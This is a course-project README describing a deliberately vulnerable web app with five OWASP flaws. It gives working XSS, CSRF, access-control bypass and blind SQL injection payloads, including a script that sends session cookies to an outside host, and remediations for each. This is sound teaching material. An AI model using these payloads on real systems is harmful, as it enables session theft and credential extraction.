# Cyber Security Base  - Project I

This is my solution for the first project of the [Cyber Security Base course](https://cybersecuritybase.github.io/). In this project our task is to create a web application that has at least five different flaws from the [OWASP top ten list](https://www.owasp.org/index.php/Top_10_2013-Top_10).

## Setup info
* Web page: [http://localhost:8080/](http://localhost:8080/)
* User accounts:
    | Username | Password |
    | -------- | -------- |
    | admin    | adminpw  |
    | user     | userpw   |
* Tools needed:
    1. netcat
    2. [BBQSQL](https://github.com/Neohapsis/bbqsql)


## Flaw 1 - Cross-Site Scripting
**OWASP description**: [A3-Cross-Site Scripting](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))

**Issue**: [Cross-Site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))

**Steps to reproduce**:

1. Go to the sign up form to create a new user.
2. In the address field insert:
    ```
    <script>document.write('<img src="http://192.168.0.117:1234/' + document.cookie + '">')</script>
    ```
3. Start a netcat server using the command `nc -lp 1234` on the specified host. When a user opens the attendees page, a request is sent to this server:

    ![Result of XSS](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/XSS_session_cookie.png)
4. We now can take over the session of this user by changing our own session cookie using `document.cookie="JSESSIONID=E0ED84B16865028DF09E522DC8B8DDC8"` in the browser console. This way we are able to steal the session of the admin user when this user logs in.

**Remediation**:

* Escape user input when showing this on a page.
* Make sure that the HTTPOnly cookie flag is set for the session ID.


## Flaw 2 - Cross-Site Request Forgery
**OWASP description**: [A8-Cross-Site Request Forgery](https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF))

**Issue**: [Cross-Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery)

**Steps to reproduce**:

1. Create an HTML with the following content:

    ```HTML
    <html>
        <body onload="document.forms[0].submit()">
            <form action="http://localhost:8080/profile" method="POST">
                <input type="hidden" name="count" id="count" value="1000" />
                <input type="submit" value="Submit" />    
            </form>
        </body>
    </html>
    ```
2. Host this page somewhere.
3. Login to the application with a user.
4. Go to the url where the CSRF attack page is hosted (e.g. https://benjaminstienlet.github.com/cybersecuritybase-project/csrf_attack.html).
5. The number of attendees for the user that was logged in is now changed to 1000:

    ![Result of CSRF](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/CSRF_result.png)

**Remediation**:

* Verify the same origin using standard headers.
* Use a secure random CSRF token for state changing operations.


## Flaw 3 - Missing Function Level Access Control
**OWASP description**: [A7-Missing Function Level Access Control](https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control)

**Issue**: Regular users can access a privileged function

**Steps to reproduce**:

1. Login as a normal user and note down your session id
2. Connect to the web server using netcat with the following command: `nc 192.168.0.185 8080`
3. Insert the following HTTP request:

    ```
    DELETE /attendees/John%20Smith HTTP/1.1
    Host: 192.168.0.185:8080
    Cookie: JSESSIONID=6DE506E932836598A6BFCA5FC6427A61
    ```

4. Press enter to submit the request. The user John Smith now is successfully removed by a regular user who should not have these rights.

    ![Result of netcat](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/privileged_function_command.png)

**Remediation**:

* Don't use "presentation layer access control" but also check in the function itself that the authenticated user has the necessary privileges to perform this function.


## Flaw 4 - Injection
**OWASP description**: [A1-Injection](https://www.owasp.org/index.php/Top_10_2013-A1-Injection)

**Issue**: [Blind SQL injection](https://www.owasp.org/index.php/Blind_SQL_Injection)

**Steps to reproduce**:

1. Login to the web application.
2. Go to the attendees page.
3. Insert `nothing' OR '1'='1` in the search field. After applying this filter, all items are still shown. This indicates that we can exploit this using SQL injection. We will have to use a blind SQL injection as the result of the query is not printed. I chose for a content-based blind SQL injection, but a time-based injection should also work.
4. We can read the data from the database by doing a binary search on the ASCII value of each character in the database and iterating over all the characters. The base query for this method is:
    ```
    1' OR (ASCII(SUBSTRING(SELECT CONCAT(NAME,':',PASSWORD) FROM ACCOUNT LIMIT 1 OFFSET 1, 1, 1)) > 63) --
    ```

    If the list of attendees is shown, the query evaluated to true and the ASCII value of the first character in the Name column for the first row in the Account table is larger than 63. If no attendees are shown, then the query evaluated to false.
5. We can now execute this base query using the tool [BBQSQL](https://github.com/Neohapsis/bbqsql) with the following configuration file:
    ```
    [Request Config]
    url = http://192.168.0.185:8080/attendees
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    cookies = {'JSESSIONID': '19EE58D182C7FE01DC0312AD14172858'}
    data = searchString=${query}
    method = post

    [HTTP Config]
    query = 1' OR (ASCII(SUBSTRING(SELECT CONCAT(NAME,':',PASSWORD) FROM ACCOUNT LIMIT 1 OFFSET ${row_index:1}, ${char_index:1}, 1)) ${comparator:>} ${char_val:0}) --
    csv_output_file = bbqsql_output.csv
    technique = binary_search
    comparison_attr = size
    concurrency = 30
    ```
6. This tool gives the following output:

    ![Result of BBQSQL](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/SQLI_result.png)

**Remediation**:

* [Parameterized queries](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_1:_Prepared_Statements_.28with_Parameterized_Queries.29) can be used as a remediation for this SQL injection.


## Flaw 5 - Sensitive Data Exposure
**OWASP description**: [A6-Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure)

**Issue**: Weak cryptographic algorithm and unsalted hashes used

**Steps to reproduce**:

1. In the previous flaw, we found the user names and hashes of the passwords. Using an [online tool](https://www.onlinehashcrack.com/hash-identification.php) to identify the hash type, we can see that these hashes are probably MD5 hashes.
2. We can check an [online reverse lookup](http://md5.gromweb.com/) for the MD5 hashes:

    ![Result of reverse lookup](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/MD5_reverse_lookup.png)
3. This way we found the passwords of the user accounts in the application.

**Remediation**:

* Select a hashing algorithm that has no known vulnerabilities. For example the standard BCrypt algorithm in the Spring framework. The implementation in Spring also uses a random salt per user.
